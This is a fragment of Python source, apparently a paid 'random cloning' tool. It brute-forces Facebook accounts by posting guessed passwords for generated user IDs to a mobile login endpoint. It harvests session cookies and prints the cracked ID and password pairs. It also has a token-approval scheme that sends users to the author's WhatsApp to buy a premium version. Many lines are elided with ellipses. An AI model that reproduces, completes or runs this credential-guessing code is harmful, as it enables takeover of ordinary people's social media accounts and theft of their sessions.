...
try:
    ...
    print(' Welcome In ANONYMOUS SKBER  Best Random Cloning System ')
...
\x1b[1;92m┗┛┛┗┛┻┛┗┛┛┗  ┗┛┗┛┻┛┗┛┛┗vr:0.4          
\x1b[1;92m┏─────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mJAHID HASSAN   
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mJ àhìd h àss àn
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801917466867               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mRandom Crack  
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSKBER-CYBER         
\x1b[1;92m┗─────────────────────────────────────────┛     
\x1b[1;97m Please Free User Not Come 
[+]====================================================[+]"""
clear()
xxxx = str(len(ugen))
#---------------------[LOOP MENU]---------------------#
...
def main():
    ...
    print(f"\033[1;97m[02] \033[1;92mFollow Me SKBER-CYBER On GITHUB ")
    ...
    if adi in ["1","01"]:
        ...
        os.system("xdg-open https://github.com/SKBER-IN")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro,}
            lo = session.post('https://www.mbasic.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mSKBER-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    cid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mSKBER-CP\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/SKBER-CYBER/Random/blob/main/Xxx.txt').text
    if id in httpCaht:
      print("\33[1;32mYOUR TOKEN Is SUCCESSFULLY APPROVED BY SKBER")
      msg = str(os.geteuid())
      time.sleep(0.5)
      main()
      pass
      ...
      print(' [+] Random Clone\n [+] Follow Me SKBER-CYBER On GITHUB\n [+] Exit menu\n\x1b[1;97m [+] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
      print(f'\n{WHITE}=============================')
      input(f'\n {GREEN}PRESS ENTER TO BUY TOOLS ')
      tks = ('Hello%SKBER%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801917466867?text=' + tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
